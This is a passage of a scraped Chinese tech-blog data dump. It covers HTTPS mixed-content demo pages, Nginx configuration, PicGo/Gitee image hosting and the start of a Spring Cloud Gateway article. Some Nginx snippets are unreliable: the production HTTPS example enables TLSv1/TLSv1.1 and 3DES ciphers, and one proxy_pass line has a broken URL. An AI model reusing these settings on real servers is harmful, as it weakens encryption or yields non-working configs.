rel&#x3D;&quot;stylesheet&quot; href&#x3D;&quot;https:&#x2F;&#x2F;fonts.googleapis.com&#x2F;icon?family&#x3D;Material+Icons&quot;&gt; &lt;link rel&#x3D;&quot;stylesheet&quot; href&#x3D;&quot;https:&#x2F;&#x2F;code.getmdl.io&#x2F;1.2.1&#x2F;material.indigo-pink.min.css&quot;&gt; &lt;script defer src&#x3D;&quot;https:&#x2F;&#x2F;code.getmdl.io&#x2F;1.2.1&#x2F;material.min.js&quot;&gt;&lt;&#x2F;script&gt; &lt;style&gt; body &#123; margin: 2em; &#125; &lt;&#x2F;style&gt; &lt;title&gt;Passive mixed content example&lt;&#x2F;title&gt; &lt;style&gt; audio, img, video &#123; display: block; margin: 10px; &#125; &lt;&#x2F;style&gt; &lt;&#x2F;head&gt; &lt;body&gt; &lt;div role&#x3D;&quot;main&quot;&gt; &lt;h1&gt; Passive mixed content! &lt;&#x2F;h1&gt; &lt;p&gt; View page over: &lt;a href&#x3D;&quot;http:&#x2F;&#x2F;googlesamples.github.io&#x2F;web-fundamentals&#x2F;fundamentals&#x2F;security&#x2F;prevent-mixed-content&#x2F;passive-mixed-content.html&quot;&gt;HTTP&lt;&#x2F;a&gt; - &lt;a href&#x3D;&quot;https:&#x2F;&#x2F;googlesamples.github.io&#x2F;web-fundamentals&#x2F;fundamentals&#x2F;security&#x2F;prevent-mixed-content&#x2F;passive-mixed-content.html&quot;&gt;HTTPS&lt;&#x2F;a&gt; &lt;&#x2F;p&gt; &lt;p&gt; Several examples of passive mixed content. When viewed over HTTPS most browsers do &lt;b&gt;not&lt;&#x2F;b&gt; block this content but instead display warnings in the JavaScript console. &lt;&#x2F;p&gt; &lt;!-- An insecure audio file loaded on a secure page --&gt; &lt;audio src&#x3D;&quot;http:&#x2F;&#x2F;googlesamples.github.io&#x2F;web-fundamentals&#x2F;fundamentals&#x2F;security&#x2F;prevent-mixed-content&#x2F;sleep.mp3&quot; type&#x3D;&quot;audio&#x2F;mp3&quot; controls&gt;&lt;&#x2F;audio&gt; &lt;!-- An insecure image loaded on a secure page --&gt; &lt;img src&#x3D;&quot;http:&#x2F;&#x2F;googlesamples.github.io&#x2F;web-fundamentals&#x2F;fundamentals&#x2F;security&#x2F;prevent-mixed-content&#x2F;puppy.jpg&quot;&gt; &lt;!-- An insecure video file loaded on a secure page --&gt; &lt;video src&#x3D;&quot;http:&#x2F;&#x2F;storage.googleapis.com&#x2F;webfundamentals-assets&#x2F;videos&#x2F;chrome.webm&quot; type&#x3D;&quot;video&#x2F;webm&quot; controls&gt;&lt;&#x2F;video&gt; &lt;&#x2F;div&gt; &lt;script&gt; (function(b,o,i,l,e,r)&#123;b.GoogleAnalyticsObject&#x3D;l;b[l]||(b[l]&#x3D; function()&#123;(b[l].q&#x3D;b[l].q||[]).push(arguments)&#125;);b[l].l&#x3D;+new Date; e&#x3D;o.createElement(i);r&#x3D;o.getElementsByTagName(i)[0]; e.src&#x3D;&#39;&#x2F;&#x2F;www.google-analytics.com&#x2F;analytics.js&#39;; r.parentNode.insertBefore(e,r)&#125;(window,document,&#39;script&#39;,&#39;ga&#39;)); ga(&#39;create&#39;,&#39;UA-52746336-1&#39;);ga(&#39;send&#39;,&#39;pageview&#39;); var isCompleted &#x3D; &#123;&#125;; function sampleCompleted(sampleName)&#123; if (ga &amp;&amp; !isCompleted.hasOwnProperty(sampleName)) &#123; ga(&#39;send&#39;, &#39;event&#39;, &#39;WebCentralSample&#39;, sampleName, &#39;completed&#39;); isCompleted[sampleName] &#x3D; true; &#125; &#125;&lt;&#x2F;script&gt; &lt;&#x2F;body&gt;&lt;&#x2F;html&gt; 试一下 大多数浏览器仍向用户渲染此类型的混合内容，但是也会显示警告，因为这些内容会给您的网站和用户带来安全风险和隐私风险。 与被动混合内容相比，主动混合内容造成的威胁更大。攻击者可以拦截和重写主动内容，从而完全控制页面，甚至整个网站。这让攻击者可以更改有关页面的任何内容，包括显示完全不同的内容、窃取用户密码或其他登录凭据、窃取用户会话 Cookie，或将用户重定向到一个完全不同的网站。 鉴于这种威胁的严重性，许多浏览器都会默认阻止此类型的内容以保护用户，但是其作用因浏览器供应商和版本而有所差异。 以下包含主动混合内容的示例： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset&#x3D;&quot;utf-8&quot;&gt; &lt;meta http-equiv&#x3D;&quot;X-UA-Compatible&quot; content&#x3D;&quot;IE&#x3D;edge&quot;&gt; &lt;meta name&#x3D;&quot;viewport&quot; content&#x3D;&quot;width&#x3D;device-width, initial-scale&#x3D;1&quot;&gt; &lt;link rel&#x3D;&quot;stylesheet&quot; href&#x3D;&quot;https:&#x2F;&#x2F;fonts.googleapis.com&#x2F;icon?family&#x3D;Material+Icons&quot;&gt; &lt;link rel&#x3D;&quot;stylesheet&quot; href&#x3D;&quot;https:&#x2F;&#x2F;code.getmdl.io&#x2F;1.2.1&#x2F;material.indigo-pink.min.css&quot;&gt; &lt;script defer src&#x3D;&quot;https:&#x2F;&#x2F;code.getmdl.io&#x2F;1.2.1&#x2F;material.min.js&quot;&gt;&lt;&#x2F;script&gt; &lt;style&gt; body &#123; margin: 2em; &#125; &lt;&#x2F;style&gt; &lt;title&gt;Active mixed content example&lt;&#x2F;title&gt; &lt;!-- An insecure script file loaded on a secure page --&gt; &lt;script src&#x3D;&quot;http:&#x2F;&#x2F;googlesamples.github.io&#x2F;web-fundamentals&#x2F;fundamentals&#x2F;security&#x2F;prevent-mixed-content&#x2F;simple-example.js&quot;&gt;&lt;&#x2F;script&gt; &lt;!-- An insecure stylesheet loaded on a secure page --&gt; &lt;link href&#x3D;&quot;http:&#x2F;&#x2F;googlesamples.github.io&#x2F;web-fundamentals&#x2F;fundamentals&#x2F;security&#x2F;prevent-mixed-content&#x2F;style.css&quot; rel&#x3D;&quot;stylesheet&quot;&gt; &lt;style&gt; .insecure-background &#123; &#x2F;* An insecure resources loaded from a style property on a secure page, this can happen in many places including, @font-face, cursor, background-image, and so on. *&#x2F; background: url(&#39;http:&#x2F;&#x2F;googlesamples.github.io&#x2F;web-fundamentals&#x2F;fundamentals&#x2F;security&#x2F;prevent-mixed-content&#x2F;puppy-thumb.jpg&#39;) no-repeat; &#125; &lt;&#x2F;style&gt; &lt;style&gt; .insecure-style-holder span &#123; color: #fff; &#125; .insecure-background &#123; color: #000; font-weight: bold; background-position: left center; background-repeat: no-repeat; width: 300px; height: 140px; &#125; iframe &#123; width: 400px; height: 300px; &#125; &lt;&#x2F;style&gt; &lt;&#x2F;head&gt; &lt;body&gt; &lt;div role&#x3D;&quot;main&quot;&gt; &lt;h1&gt; Active mixed content! &lt;&#x2F;h1&gt; &lt;p&gt; View page over: &lt;a href&#x3D;&quot;http:&#x2F;&#x2F;googlesamples.github.io&#x2F;web-fundamentals&#x2F;fundamentals&#x2F;security&#x2F;prevent-mixed-content&#x2F;active-mixed-content.html&quot;&gt;HTTP&lt;&#x2F;a&gt; - &lt;a href&#x3D;&quot;https:&#x2F;&#x2F;googlesamples.github.io&#x2F;web-fundamentals&#x2F;fundamentals&#x2F;security&#x2F;prevent-mixed-content&#x2F;active-mixed-content.html&quot;&gt;HTTPS&lt;&#x2F;a&gt; &lt;&#x2F;p&gt; &lt;p&gt; Several examples of active mixed content. When viewed over HTTPS most browsers block this content and display errors in the JavaScript console. &lt;&#x2F;p&gt; &lt;div class&#x3D;&quot;insecure-style-holder&quot;&gt; &lt;span style&#x3D;&quot;ba&quot;&gt;Insecure style loaded&lt;&#x2F;span&gt; &lt;&#x2F;div&gt; &lt;div class&#x3D;&quot;insecure-background&quot;&gt; Loading insecure background here... &lt;&#x2F;div&gt; &lt;p&gt;Loading insecure iframe...&lt;&#x2F;p&gt; &lt;!-- An insecure iframed page loaded on a secure page --&gt; &lt;iframe src&#x3D;&quot;http:&#x2F;&#x2F;googlesamples.github.io&#x2F;web-fundamentals&#x2F;fundamentals&#x2F;security&#x2F;prevent-mixed-content&#x2F;image-gallery-example.html&quot;&gt;&lt;&#x2F;iframe&gt; &lt;!-- Flash resources also qualify as active mixed content and pose a serious security risk. Be sure to look for &lt;object&gt; tags with type set to &quot;application&#x2F;x-shockwave-flash&quot;, and an http:&#x2F;&#x2F; data attribute. --&gt; &lt;!-- &lt;object type&#x3D;&quot;application&#x2F;x-shockwave-flash&quot; data&#x3D;&quot;http:&#x2F;&#x2F;...&quot;&gt;&lt;&#x2F;object&gt; --&gt; &lt;script&gt; &#x2F;&#x2F; An insecure resource loaded using XMLHttpRequest var request &#x3D; new XMLHttpRequest(); request.addEventListener(&#39;load&#39;, function() &#123; var jsonData &#x3D; JSON.parse(request.responseText); document.getElementById(&#39;output&#39;).innerHTML +&#x3D; &#39;&lt;br&gt;&#39; + jsonData.data; &#125;); request.open(&quot;GET&quot;, &quot;http:&#x2F;&#x2F;googlesamples.github.io&#x2F;web-fundamentals&#x2F;fundamentals&#x2F;security&#x2F;prevent-mixed-content&#x2F;xmlhttprequest-data.js&quot;, true); request.send(); &lt;&#x2F;script&gt; &lt;div id&#x3D;&quot;output&quot;&gt;Waiting for insecure script to run...&lt;&#x2F;div&gt; &lt;&#x2F;div&gt; &lt;script&gt; (function(b,o,i,l,e,r)&#123;b.GoogleAnalyticsObject&#x3D;l;b[l]||(b[l]&#x3D; function()&#123;(b[l].q&#x3D;b[l].q||[]).push(arguments)&#125;);b[l].l&#x3D;+new Date; e&#x3D;o.createElement(i);r&#x3D;o.getElementsByTagName(i)[0]; e.src&#x3D;&#39;&#x2F;&#x2F;www.google-analytics.com&#x2F;analytics.js&#39;; r.parentNode.insertBefore(e,r)&#125;(window,document,&#39;script&#39;,&#39;ga&#39;)); ga(&#39;create&#39;,&#39;UA-52746336-1&#39;);ga(&#39;send&#39;,&#39;pageview&#39;); var isCompleted &#x3D; &#123;&#125;; function sampleCompleted(sampleName)&#123; if (ga &amp;&amp; !isCompleted.hasOwnProperty(sampleName)) &#123; ga(&#39;send&#39;, &#39;event&#39;, &#39;WebCentralSample&#39;, sampleName, &#39;completed&#39;); isCompleted[sampleName] &#x3D; true; &#125; &#125;&lt;&#x2F;script&gt; &lt;&#x2F;body&gt;&lt;&#x2F;html&gt; 试一下 具有混合内容的浏览器行为鉴于上述威胁，浏览器最好是阻止所有混合内容。 但是，这将破坏大量网站，而数百万用户每天都要访问这些网站。 当前的折衷做法是阻止最危险的混合内容类型，同时仍允许请求不太危险的混合内容类型。 现代浏览器遵循混合内容规范，其定义了可选择性地阻止的内容和可阻止的内容类别。 根据此规范，“当破坏网络重要部分的风险超过允许此资源作为混合内容使用的风险时”，该资源有资格成为可选择性阻止的内容；这是上述被动混合内容类别的子集。在撰写本文时，可选择性阻止的内容中仅包括图像、视频和音频资源以及预获取的链接这些资源类型。随着时间的推移，此类别可能会缩小。 可选择性阻止的内容以外的所有内容被视为可阻止的内容，将被浏览器阻止。 浏览器版本切记，并不是网站的每个访问者都使用最新的浏览器。 不同浏览器供应商的不同版本的浏览器处理混合内容的方式不尽相同。 最糟糕的情况是，有些浏览器和版本根本不会阻止任何混合内容，这对于用户而言非常不安全。 每个浏览器的确切行为不断变化，因此，我们在这里不做具体介绍。 如果您对特定浏览器的行为方式感兴趣，请直接查看供应商发布的信息。 缺少中间根证书还有一种情况是由于证书链不完整缺少中间根证书导致的。这个情况下找到SSL证书的中间根证书、补全证书链再重新安装即可解决问题。 以上即为几种常见的导致SSL证书部署后仍出现不安全提示的原因。如果一一排查之后还是不能解决问题，或者处理过程中不知该如何操作，可提交工单或在线联系必盛云客服为您处理。 相关文章： Comodo证书合并及转换教程 Digicert、Symantec和Geotrust证书合并及转换教程 申请SSL证书怎样做域名验证 如何申请OV/EV SSL 证书 如何部署SSL证书 Apache服务器安装SSL证书 如何备份或导出SSL证书 IP地址可以安装SSL证书吗？ 混合内容","categories":[{"name":"网站","slug":"网站","permalink":"https://gschaos.club/categories/%E7%BD%91%E7%AB%99/"}],"tags":[{"name":"服务器","slug":"服务器","permalink":"https://gschaos.club/tags/%E6%9C%8D%E5%8A%A1%E5%99%A8/"},{"name":"ssl","slug":"ssl","permalink":"https://gschaos.club/tags/ssl/"},{"name":"网站","slug":"网站","permalink":"https://gschaos.club/tags/%E7%BD%91%E7%AB%99/"},{"name":"https","slug":"https","permalink":"https://gschaos.club/tags/https/"}]},{"title":"Nginx 配置","slug":"Nginx 配置","date":"2020-09-06T16:00:00.000Z","updated":"2020-10-25T08:25:41.000Z","comments":true,"path":"Nginx 配置/","link":"","permalink":"https://gschaos.club/Nginx%20%E9%85%8D%E7%BD%AE/","excerpt":"在了解具体的Nginx配置项之前我们需要对于Nginx配置文件的构成有所概念，一般来说，Nginx配置文件会由如下几个部分构成：","text":"在了解具体的Nginx配置项之前我们需要对于Nginx配置文件的构成有所概念，一般来说，Nginx配置文件会由如下几个部分构成： Nginx 配置在了解具体的Nginx配置项之前我们需要对于Nginx配置文件的构成有所概念，一般来说，Nginx配置文件会由如下几个部分构成： 123456789101112131415161718192021222324252627282930313233# 全局块... # events块events &#123; ...&#125;# http块http &#123; # http全局块 ... # 虚拟主机server块 server &#123; # server全局块 ... # location块 location [PATTERN] &#123; ... &#125; location [PATTERN] &#123; ... &#125; &#125; server &#123; ... &#125; # http全局块 ... &#125; 在上述配置中我们可以看出，Nginx配置文件由以下几个部分构成： 全局块：配置影响nginx全局的指令。一般有运行nginx服务器的用户组，nginx进程pid存放路径，日志存放路径，配置文件引入，允许生成worker process数等。 events块：配置影响nginx服务器或与用户的网络连接。有每个进程的最大连接数，选取哪种事件驱动模型处理连接请求，是否允许同时接受多个网路连接，开启多个网络连接序列化等。 http块：可以嵌套多个server，配置代理，缓存，日志定义等绝大多数功能和第三方模块的配置。如文件引入，mime-type定义，日志自定义，是否使用sendfile传输文件，连接超时时间，单连接请求数等。 server块：配置虚拟主机的相关参数，一个http中可以有多个server。 location块：配置请求的路由，以及各种页面的处理情况。 123456789101112131415161718192021222324252627282930313233343536373839404142########### 每个指令必须有分号结束。##################user administrator administrators; #配置用户或者组，默认为nobody nobody。#worker_processes 2; #允许生成的进程数，默认为1#pid /nginx/pid/nginx.pid; #指定nginx进程运行文件存放地址error_log log/error.log debug; #制定日志路径，级别。这个设置可以放入全局块，http块，server块，级别以此为：debug|info|notice|warn|error|crit|alert|emergevents &#123; accept_mutex on; #设置网路连接序列化，防止惊群现象发生，默认为on multi_accept on; #设置一个进程是否同时接受多个网络连接，默认为off #use epoll; #事件驱动模型，select|poll|kqueue|epoll|resig|/dev/poll|eventport worker_connections 1024; #最大连接数，默认为512&#125;http &#123; include mime.types; #文件扩展名与文件类型映射表 default_type application/octet-stream; #默认文件类型，默认为text/plain #access_log off; #取消服务日志 log_format myFormat &#x27;$remote_addr–$remote_user [$time_local] $request $status $body_bytes_sent $http_referer $http_user_agent $http_x_forwarded_for&#x27;; #自定义格式 access_log log/access.log myFormat; #combined为日志格式的默认值 sendfile on; #允许sendfile方式传输文件，默认为off，可以在http块，server块，location块。 sendfile_max_chunk 100k; #每个进程每次调用传输数量不能大于设定的值，默认为0，即不设上限。 keepalive_timeout 65; #连接超时时间，默认为75s，可以在http，server，location块。 # 定义常量 upstream mysvr &#123; server 127.0.0.1:7878; server 192.168.10.121:3333 backup; #热备 &#125; error_page 404 https://www.baidu.com; #错误页 #定义某个负载均衡服务器 server &#123; keepalive_requests 120; #单连接请求上限次数。 listen 4545; #监听端口 server_name 127.0.0.1; #监听地址 location ~*^.+$ &#123; #请求的url过滤，正则匹配，~为区分大小写，~*为不区分大小写。 #root path; #根目录 #index vv.txt; #设置默认页 proxy_pass http://mysvr; #请求转向mysvr 定义的服务器列表 deny 127.0.0.1; #拒绝的ip allow 172.18.5.54; #允许的ip &#125; &#125;&#125; 虚拟主机与静态站点 SERVING STATIC CONTENT 本部分概述如何配置Nginx进行静态内容服务，Nginx的静态内容分发能力还是非常强大的。 1234567891011121314151617181920http &#123; server &#123; listen 80; server_name www.domain1.com; access_log logs/domain1.access.log main; location / &#123; index index.html; root /var/www/domain1.com/htdocs; &#125; &#125; server &#123; listen 80; server_name www.domain2.com; access_log logs/domain2.access.log main; location / &#123; index index.html; root /var/www/domain2.com/htdocs; &#125; &#125;&#125; 虚拟主机配置详解主机与端口12345678listen 127.0.0.1:8000;listen *:8000;listen localhost:8000;# IPV6listen [::]:8000;# other paramslisten 443 default_server ssl;listen 127.0.0.1 default_server accept_filter=dataready backlog=1024 服务域名123456# 支持多域名配置server_name www.barretlee.com barretlee.com;# 支持泛域名解析server_name *.barretlee.com;# 支持对于域名的正则匹配server_name ~^\\.barret\\.com$; URI匹配12345678910111213location = / &#123; # 完全匹配 = # 大小写敏感 ~ # 忽略大小写 ~*&#125;location ^~ /images/ &#123; # 前半部分匹配 ^~ # 可以使用正则，如： # location ~* \\.(gif|jpg|png)$ &#123; &#125;&#125;location / &#123; # 如果以上都未匹配，会进入这里&#125; 文件路径配置根目录123location / &#123; root /home/barret/test/;&#125; 别名12345678location /blog &#123; alias /home/barret/www/blog/;&#125;location ~ ^/blog/(\\d+)/([\\w-]+)$ &#123; # /blog/20141202/article-name # -&gt; /blog/20141202-article-name.md alias /home/barret/www/blog/$1-$2.md;&#125; 首页1index /html/index.html /php/index.php; 重定向页面12345678910error_page 404 /404.html;error_page 502 503 /50x.html;error_page 404 =200 /1x1.gif;location / &#123; error_page 404 @fallback;&#125;location @fallback &#123; # 将请求反向代理到上游服务器处理 proxy_pass http://localhost:9000;&#125; try_files123456789try_files $uri $uri.html $uri/index.html @other;location @other &#123; # 尝试寻找匹配 uri 的文件，失败了就会转到上游处理 proxy_pass http://localhost:9000;&#125;location / &#123; # 尝试寻找匹配 uri 的文件，没找到直接返回 502 try_files $uri $uri.html =502;&#125; 缓存配置 HTTP 缓存的四种风味与缓存策略 Expire:过期时间在Nginx中可以配置缓存的过期时间： 12345location ~* \\.(?:ico|css|js|gif|jpe?g|png)$ &#123; expires 30d; add_header Vary Accept-Encoding; access_log off; &#125; 我们也可以添加更复杂的配置项： 12345678910111213location ~* ^.+\\.(?:css|cur|js|jpe?g|gif|htc|ico|png|html|xml|otf|ttf|eot|woff|svg)$ &#123; access_log off; expires 30d; ## No need to bleed constant updates. Send the all shebang in one ## fell swoop. tcp_nodelay off; ## Set the OS file cache. open_file_cache max=3000 inactive=120s; open_file_cache_valid 45s; open_file_cache_min_uses 2; open_file_cache_errors off;&#125; 反向代理123456789101112131415161718192021222324events&#123;&#125;http&#123; upstream ggzy &#123; server 127.0.0.1:1398 weight=3; server 127.0.0.1:1399; &#125; # 80端口配置，可配置多个Virtual Host server &#123; listen 80; index index index.htm index.py index.html; server_name app.truelore.cn; location / &#123; proxy_pass_header Server; proxy_set_header Host $http_host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Scheme $scheme; proxy_pass http//ggzy; &#125; &#125;&#125; NodeJS Application1234const http = require(&#x27;http&#x27;);http.createServer((req, res) =&gt; &#123; res.end(&#x27;hello world&#x27;);&#125;).listen(9000); 任何请求过来都返回 hello world，简版的 Nginx 配置如下， 12345678910111213141516171819202122events &#123; # 这里可不写东西 use epoll;&#125;http &#123; server &#123; listen 127.0.0.1:8888; # 如果请求路径跟文件路径按照如下方式匹配找到了，直接返回 try_files $uri $uri/index.html; location ~* ^/(js|css|image|font)/$ &#123; # 静态资源都在 static 文件夹下 root /home/barret/www/static/; &#125; location /app &#123; # Node.js 在 9000 开了一个监听端口 proxy_pass http://127.0.0.1:9000; &#125; # 上面处理出错或者未找到的，返回对应状态码文件 error_page 404 /404.html; error_page 502 503 504 /50x.html; &#125;&#125; 首先 try_files，尝试直接匹配文件；没找到就匹配静态资源；还没找到就交给 Node 处理；否则就返回 4xx/5xx 的状态码。 Upstream Cache A Guide to Caching with NGINX and NGINX Plus 123456789101112131415161718http &#123; ,,,,, proxy_cache_path /var/cache/nginx/cache levels=1:2 keys_zone=imgcache:100m inactive=1d max_size=10g; server &#123; ........ location ~* ^.+\\.(js|ico|gif|jpg|jpeg|png|html|htm)$ &#123; log_not_found off; access_log off; expires 7d; proxy_pass http://img.example.com ; proxy_cache imgcache; proxy_cache_valid 200 302 1d; proxy_cache_valid 404 10m; proxy_cache_valid any 1h; proxy_cache_use_stale error timeout invalid_header updating http_500 http_502 http_503 http_504; &#125; &#125;&#125; HTTPS HTTPS 理论详解与实践 Let’s Encrypt 证书申请Let’s Encrypt 为我们提供了非常方便的命令行工具certbot，笔者是在Ubuntu 16.04的机器上进行配置，因此只要执行如下命令即可: 1234567# 安装letsencrypt命令行$ sudo apt-get install letsencrypt # 独立的为example.com与www.example.com申请证书$ letsencrypt certonly --standalone -d example.com -d www.example.com# 自动执行证书刷新操作$ letsencrypt renew --dry-run --agree-tos 基本HTTPS配置基本的HTTPS支持配置如下: 12345678910server &#123; listen 192.168.1.11:443; #ssl端口 server_name test.com; #为一个server&#123;......&#125;开启ssl支持 ssl on; #指定PEM格式的证书文件 ssl_certificate /etc/nginx/test.pem; #指定PEM格式的私钥文件 ssl_certificate_key /etc/nginx/test.key; &#125; 在真实的生产环境中，我们的配置如下: 123456789101112131415161718192021222324252627282930313233343536373839404142434445server &#123; # 如果需要spdy也可以加上,lnmp1.2及其后版本都默认支持spdy,lnmp1.3 nginx 1.9.5以上版本默认支持http2 listen 443 ssl; # 这里是你的域名 server_name www.vpser.net; index index.html index.htm index.php default.html default.htm default.php; # 网站目录 root /home/wwwroot/www.vpser.net; # 前面生成的证书，改一下里面的域名就行 ssl_certificate /etc/letsencrypt/live/www.vpser.net/fullchain.pem; # 前面生成的密钥，改一下里面的域名就行 ssl_certificate_key /etc/letsencrypt/live/www.vpser.net/privkey.pem; ssl_ciphers &quot;EECDH+CHACHA20:EECDH+CHACHA20-draft:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5&quot;; ssl_protocols TLSv1 TLSv1.1 TLSv1.2; ssl_prefer_server_ciphers on; ssl_session_cache shared:SSL:10m; #这个是伪静态根据自己的需求改成其他或删除 include wordpress.conf; #error_page 404 /404.html; location ~ [^/]\\.php(/|$) &#123; # comment try_files $uri =404; to enable pathinfo try_files $uri =404; fastcgi_pass unix:/tmp/php-cgi.sock; fastcgi_index index.php; # lnmp 1.0及之前版本替换为include fcgi.conf; include fastcgi.conf; #include pathinfo.conf; &#125; location ~ .*\\.(gif|jpg|jpeg|png|bmp|swf)$ &#123; expires 30d; &#125; location ~ .*\\.(js|css)?$ &#123; expires 12h; &#125; access_log off;&#125; 强制HTTP转到HTTPSNginx Rewrite12345server &#123; listen 192.168.1.111:80; server_name test.com; rewrite ^(.*)$ https://$host$1 permanent; &#125; Nginx 497错误码利用error_page命令将497状态码的链接重定向到https://test.com这个域名上 1234567891011121314server &#123; listen 192.168.1.11:443; #ssl端口 listen 192.168.1.11:80; #用户习惯用http访问，加上80，后面通过497状态码让它自动跳到443端口 server_name test.com; #为一个server&#123;......&#125;开启ssl支持 ssl on; #指定PEM格式的证书文件 ssl_certificate /etc/nginx/test.pem; #指定PEM格式的私钥文件 ssl_certificate_key /etc/nginx/test.key; #让http请求重定向到https请求 error_page 497 https://$host$uri?$args; &#125; Meta刷新，前端跳转在HTTP正常返回的页面中添加meta属性： 1234567891011121314&lt;html&gt; &lt;meta http-equiv=&quot;refresh&quot; content=&quot;0;url=https://test.com/&quot;&gt; &lt;/html&gt; server &#123; listen 192.168.1.11:80; server_name test.com; location / &#123; #index.html放在虚拟主机监听的根目录下 root /srv/www/http.test.com/; &#125; #将404的页面重定向到https的首页 error_page 404 https://test.com/; &#125; 反向HTTPS转发到内部HTTP","categories":[{"name":"nginx","slug":"nginx","permalink":"https://gschaos.club/categories/nginx/"}],"tags":[{"name":"nginx","slug":"nginx","permalink":"https://gschaos.club/tags/nginx/"},{"name":"操作系统","slug":"操作系统","permalink":"https://gschaos.club/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"}]},{"title":"PicGo + Gitee(码云)实现markdown图床","slug":"PicGo+Gitee(码云)实现markdown图床","date":"2020-09-06T16:00:00.000Z","updated":"2020-10-25T08:26:11.000Z","comments":true,"path":"PicGo+Gitee(码云)实现markdown图床/","link":"","permalink":"https://gschaos.club/PicGo+Gitee(%E7%A0%81%E4%BA%91)%E5%AE%9E%E7%8E%B0markdown%E5%9B%BE%E5%BA%8A/","excerpt":"PicGo + Gitee(码云)实现markdown图床","text":"PicGo + Gitee(码云)实现markdown图床 效果图： PicGo + Gitee(码云)实现markdown图床PicGo + Gitee(码云)实现markdown图床1. 安装 PicGo picgo-plugin-gitee-uploader插件 首先打开picgo官网，下载安装包 如果速度慢，点击此地址下载： mac: https://gschaos.club/down/PicGo-2.3.0-beta.3-mac.zip win: https://gschaos.club/down/PicGo-Setup-2.3.0-beta.3.exe 安装之后打开主界面 选择最底下的插件设置，搜索gitee 点击右边的gitee-uploader 1.1.2开始安装 这里注意一下，必须要先安装node.js才能安装插件，没装的自己装一下，然后重启就行。 2. 建立图床库点击右上角的+号，新建仓库 新建仓库的要点如下： 输入一个仓库名称 其次将仓库设为公开 勾选使用Readme文件初始化这个仓库 点击下一步完成创建 3. 配置PicGo安装了gitee-uploader 1.1.2插件之后，我们开始配置插件 配置插件的要点如下： repo：用户名/仓库名称，比如我自己的仓库MysticalYu/pic，找不到的可以直接复制仓库的url,复制浏览器的仓库地址，而不是页面左上角显示的，容易出现大小写问题 branch：分支，这里写上master token：填入码云的私人令牌 path：路径，一般写上img customPath：提交消息，这一项和下一项customURL都不用填。在提交到码云后，会显示提交消息，插件默认提交的是 Upload 图片名 by picGo - 时间 这个token怎么获取，下面登录进自己的码云 点击头像，进入设置 找到右边安全设置里面的私人令牌 点击生成新令牌，把projects这一项勾上，其他的不用勾，然后提交 这里需要验证一下密码，验证密码之后会出来一串数字，这一串数字就是你的token，将这串数字复制到刚才的配置里面去。 注意：这个令牌只会明文显示一次，建议在配置插件的时候再来生成令牌，直接复制进去，搞丢了又要重新生成一个。 保存，完成即可。4. 将仓库配置成giteePage页我们需要通过链接来访问图片，这里将刚才建立的仓库设置成GiteePage页 点击服务，选择Gitee Pages 如果自己想使用Https的图片，比如自己的博客网站是支持SSL认证的话，可以勾选强制使用Https; 这里参考：为什么部署SSL证书后还是提示不安全 开启成功后再次访问就会变成下面的页面，这里的更新间隔是一分钟，需要手动更新，当然也可以配置WebHook触发服务器钩子来调用API自动更新，这里不涉及这方面，不展开。 这样我们就获得了一个可以访问的网址通过这个网址和上面PicGo配置的Path组合就可以访问我们需要的图片的。类似这种： https://mysticalyu.gitee.io/pic/img/20200409141450-lee-gh-2.jpg Typora配置PicGo**一个编写md文件的神器，官网地址：https://typora.io/ ** 使用方法和基本配置见百度谷歌。 这里说明一下如何配置PicGo文件上传到服务器。 配置如下 配置好PigGo的执行文件 验证一下图片是否能上传成功 这里可以选择插入图片的操作，比如直接上传服务器。 以上配置后，基本就可以实现自己的图床了。 题外GiteePage读取的是仓库的index.html页面，所以我们可以下载一些画廊的模板来放在index页面，至于画廊如何读取上传的图片就自己琢磨吧。 附上自己的画廊地址:https://www.gschaos.club/gallery/","categories":[{"name":"图床","slug":"图床","permalink":"https://gschaos.club/categories/%E5%9B%BE%E5%BA%8A/"}],"tags":[{"name":"图床","slug":"图床","permalink":"https://gschaos.club/tags/%E5%9B%BE%E5%BA%8A/"}]},{"title":"Spring Cloud Gateway 读取、修改请求体（解决request body内容被截断）","slug":"Spring Cloud Gateway截断","date":"2020-09-06T16:00:00.000Z","updated":"2020-10-25T08:27:37.000Z","comments":true,"path":"Spring Cloud Gateway截断/","link":"","permalink":"https://gschaos.club/Spring%20Cloud%20Gateway%E6%88%AA%E6%96%AD/","excerpt":"Spring Cloud Gateway 读取、修改请求体（解决request body内容被截断基于2.0.6版本，升级版本后可能不存在此问题）","text":"Spring Cloud Gateway 读取、修改请求体（解决request body内容被截断基于2.0.6版本，升级版本后可能不存在此问题） Spring Cloud Gateway 读取、修改请求体（解决request body内容被截断）本文涉及到的项目使用的版本如下： Spring Boot：2.0.6.RELEASE Spring Cloud：Finchley.SR2 背景：微服务架构，在网关服务里拦截每个请求，进行日志信息记录与管理，发现当请求体过长时，只能获取到一部分body，查看拦截过滤器，发现Spring Cloud Gateway是基于reactor-core.jar进行请求数据的操作，获取body内容时，用到了reactor-core.jar的Flux，即一个包含0-N个DataBuffer类型元素的同步序列。 之前尝试了网上多种写法，不管是使用subscribe还是block，都无效 subscribe只会接收到第一个发出的元素，所以会导致获取不全，不管使用AtomicReference还是StringBuilder来包装获取到的字符串，都无效。 翻看Spring Cloud Gateway包，会发现有个官方自带的修改请求体内容的过滤器工厂类：ModifyRequestBodyGatewayFilterFactory（对应的还有修改输出的body的过滤器工厂类） 但是因为要结合我们自己的业务逻辑，所以这个类我们无法直接使用，但是可以自己定义一个类似的过滤器。 正确写法： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586package cn.miao.gateway.filter;import lombok.extern.slf4j.Slf4j;import org.springframework.cloud.gateway.filter.GatewayFilter;import org.springframework.cloud.gateway.filter.GatewayFilterChain;import org.springframework.cloud.gateway.support.BodyInserterContext;import org.springframework.cloud.gateway.support.CachedBodyOutputMessage;import org.springframework.cloud.gateway.support.DefaultServerRequest;import org.springframework.core.Ordered;import org.springframework.core.io.buffer.DataBuffer;import org.springframework.http.HttpHeaders;import org.springframework.http.HttpMethod;import org.springframework.http.MediaType;import org.springframework.http.server.reactive.ServerHttpRequest;import org.springframework.http.server.reactive.ServerHttpRequestDecorator;import 